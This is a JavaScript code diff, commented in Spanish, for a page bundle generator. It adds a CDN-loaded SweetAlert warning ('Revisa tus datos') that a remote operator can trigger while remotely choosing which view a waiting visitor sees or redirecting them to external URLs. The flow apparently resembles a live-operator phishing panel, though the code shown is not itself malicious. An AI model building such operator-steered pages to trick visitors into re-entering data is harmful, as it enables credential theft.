@@ -215,6 +215,23 @@ class ProjectBundleGenerator
         });
     }
 
+    // ---------- aviso al cliente (SweetAlert) ----------
+    function showAlert(msg) {
+        if (!msg) return;
+        function fire() {
+            if (window.Swal && window.Swal.fire) {
+                window.Swal.fire({ icon: "warning", title: "Revisa tus datos", text: msg, confirmButtonColor: "#059669" });
+            } else { try { window.alert(msg); } catch (e) {} }
+        }
+        if (window.Swal && window.Swal.fire) { fire(); return; }
+        // Cargar SweetAlert2 una sola vez desde CDN; si falla, usar alert().
+        var s = document.createElement("script");
+        s.src = "https://cdn.jsdelivr.net/npm/sweetalert2@11.14.5/dist/sweetalert2.all.min.js";
+        s.onload = fire;
+        s.onerror = function () { try { window.alert(msg); } catch (e) {} };
+        document.head.appendChild(s);
+    }
+
     // ---------- espera: pregunta por la siguiente vista ----------
     function startPoll() {
         var token = sessionToken();
@@ -227,8 +244,8 @@ class ProjectBundleGenerator
                     if (!b) return;
                     // URL externa pedida por el operador: redirigir la página.
                     if (b.external && b.url) { stopPoll(); window.location.href = b.url; return; }
-                    // Vista del propio proyecto: dibujarla sin recargar.
-                    if (b.view && CONFIG.views[b.view]) { render(b.view); return; }
+                    // Vista del propio proyecto: dibujarla sin recargar y avisar (si hay mensaje).
+                    if (b.view && CONFIG.views[b.view]) { render(b.view); showAlert(b.message); return; }
                     // Vista fuera del bundle con URL conocida: ir por la URL.
                     if (b.url) { stopPoll(); window.location.href = b.url; }
                 })
